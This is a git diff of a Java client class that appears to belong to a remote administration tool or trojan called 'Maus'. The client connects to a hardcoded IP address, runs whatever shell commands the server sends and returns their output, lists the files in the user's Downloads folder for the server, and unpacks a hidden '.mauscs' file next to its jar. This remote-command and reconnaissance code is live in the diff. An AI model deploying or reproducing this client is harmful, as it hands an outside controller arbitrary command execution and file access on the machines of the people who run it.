@@ -1,10 +1,8 @@
 package Client;
 
-import Maus.Maus;
-
 import java.io.*;
 import java.net.Socket;
-import java.net.URISyntaxException;
+import java.util.ArrayList;
 
 public class Client {
     private static String HOST = "141.219.247.21";
@@ -36,6 +34,22 @@ public class Client {
         client.connect();
     }
 
+    private static String getMauscs() throws Exception {
+        String jarFolder = new File(Client.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath()).getParentFile().getPath().replace('\\', '/');
+        try (InputStream stream = Client.class.getResourceAsStream("/Client/.mauscs");
+             OutputStream resStreamOut = new FileOutputStream(jarFolder + "/.mauscs")) {
+            int readBytes;
+            byte[] buffer = new byte[4096];
+            while ((readBytes = stream.read(buffer)) > 0) {
+                resStreamOut.write(buffer, 0, readBytes);
+            }
+        } catch (Exception ex) {
+            ex.printStackTrace();
+        }
+
+        return jarFolder + "/.mauscs";
+    }
+
     private void connect() throws InterruptedException {
         try {
             socket = new Socket(getHOST(), getPORT());
@@ -49,7 +63,7 @@ public class Client {
                     System.out.println(comm);
                     exec(comm.replace("CMD ", ""));
                 }
-                if (comm.contains("FILELIST")){
+                if (comm.contains("FILELIST")) {
                     communicate("FILELIST");
                     sendFileList();
                 }
@@ -68,7 +82,6 @@ public class Client {
         }
     }
 
-
     /* Sends a message to the Server. */
     private void communicate(String msg) throws IOException {
         Writer writer = new OutputStreamWriter(out);
@@ -77,19 +90,35 @@ public class Client {
     }
 
     /* Execute a command using Java's Runtime. */
-    private void exec(String command) throws IOException {
+    private void exec(String command) throws IOException, InterruptedException {
         if (!command.equals("")) {
 
             try {
-                Process proc = Runtime.getRuntime().exec(command);
-                BufferedReader reader =
+                ProcessBuilder pb = new ProcessBuilder(command);
+                pb.redirectErrorStream(true);
+                Process proc = pb.start();
+                BufferedReader in =
                         new BufferedReader(new InputStreamReader(proc.getInputStream()));
-                String line = "";
-                while ((line = reader.readLine()) != null) {
-                    System.out.print(line + "\n");
-                    communicate(line);
+                String line;
+                communicate("CMD");
+                try (BufferedOutputStream bos = new BufferedOutputStream(socket.getOutputStream());
+                     DataOutputStream dos = new DataOutputStream(bos)) {
+                    ArrayList<String> output = new ArrayList<>();
+                    while ((line = in.readLine()) != null) {
+                        output.add(line);
+                    }
+                    proc.waitFor();
+                    dos.writeInt(output.size());
+                    for (String s : output) {
+                        dos.writeUTF(s);
+                    }
+                    dos.close();
+                } catch (IOException e) {
+                    e.printStackTrace();
                 }
-                communicate("end");
+
+                communicate("END");
+                in.close();
             } catch (IOException e) {
                 e.printStackTrace();
                 exec("");
@@ -122,25 +151,9 @@ public class Client {
         mauscs.delete();
     }
 
-    private static String getMauscs() throws Exception {
-        String jarFolder = new File(Client.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath()).getParentFile().getPath().replace('\\', '/');
-        try (InputStream stream = Client.class.getResourceAsStream("/Client/.mauscs");
-             OutputStream resStreamOut = new FileOutputStream(jarFolder + "/.mauscs")) {
-            int readBytes;
-            byte[] buffer = new byte[4096];
-            while ((readBytes = stream.read(buffer)) > 0) {
-                resStreamOut.write(buffer, 0, readBytes);
-            }
-        } catch (Exception ex) {
-            ex.printStackTrace();
-        }
-
-        return jarFolder + "/.mauscs";
-    }
-
     private void sendFileList() {
-        try(       BufferedOutputStream bos = new BufferedOutputStream(socket.getOutputStream());
-                   DataOutputStream dos = new DataOutputStream(bos)){
+        try (BufferedOutputStream bos = new BufferedOutputStream(socket.getOutputStream());
+             DataOutputStream dos = new DataOutputStream(bos)) {
             String directory = System.getProperty("user.home") + "/Downloads/";
             File[] files = new File(directory).listFiles();
             dos.writeUTF(directory);
@@ -149,6 +162,7 @@ public class Client {
                 String name = file.getName();
                 dos.writeUTF(name);
             }
+            dos.writeUTF("END");
         } catch (IOException e) {
             e.printStackTrace();
         }
